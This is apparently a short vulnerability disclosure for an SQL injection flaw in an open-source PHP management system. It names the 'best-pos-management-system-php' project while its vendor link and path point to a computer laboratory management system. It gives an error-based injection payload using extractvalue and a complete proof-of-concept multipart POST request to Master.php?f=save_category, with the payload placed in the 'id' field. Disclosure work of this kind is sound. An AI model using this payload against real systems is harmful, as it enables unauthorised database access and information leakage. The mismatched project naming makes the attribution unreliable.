# SQL-7

# Vulnerability Description

The best-pos-management-system-php in PHP Free Source Code (It is an open source project from [www.sourcecodester.com](www.sourcecodester.com)) has SQL injection vulnerabilities, which can lead to database information leakage.

1. BUG_Author:
2. vendors: [https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html](https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html)
3. The program is built using the PHP 7.3.4nts version;
4. Vulnerability location: /php-lms/classes/Master.php?f=save_category

[+] Payload:

```http
extractvalue(1,concat(char(126),md5(1919725625)))
```

POC：

```http
POST http://localhost/php-lms/classes/Master.php?f=save_category HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------190692357828557768523090036370
Content-Length: 2285634
Origin: http://localhost
Connection: close
Referer: http://localhost/php-lms/admin/?page=category
Cookie: PHPSESSID=13o927b44gh33i0a70b00sc0ac
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------190692357828557768523090036370
Content-Disposition: form-data; name="id"

extractvalue(1,concat(char(126),md5(1919725625)))
-----------------------------190692357828557768523090036370
Content-Disposition: form-data; name="name"

Mouse
-----------------------------190692357828557768523090036370
Content-Disposition: form-data; name="description"

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer molestie ipsum ornare nunc pellentesque, ut iaculis diam facilisis.
-----------------------------190692357828557768523090036370
Content-Disposition: form-data; name="status"

1
-----------------------------190692357828557768523090036370
Content-Disposition: form-data; name="img"; filename="警院邀请函.jpg"
Content-Type: image/jpeg

aaaa
```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author and execute the poc provided above：

​![image](assets/image-20240401093600-3wu5ehz.png)​

‍
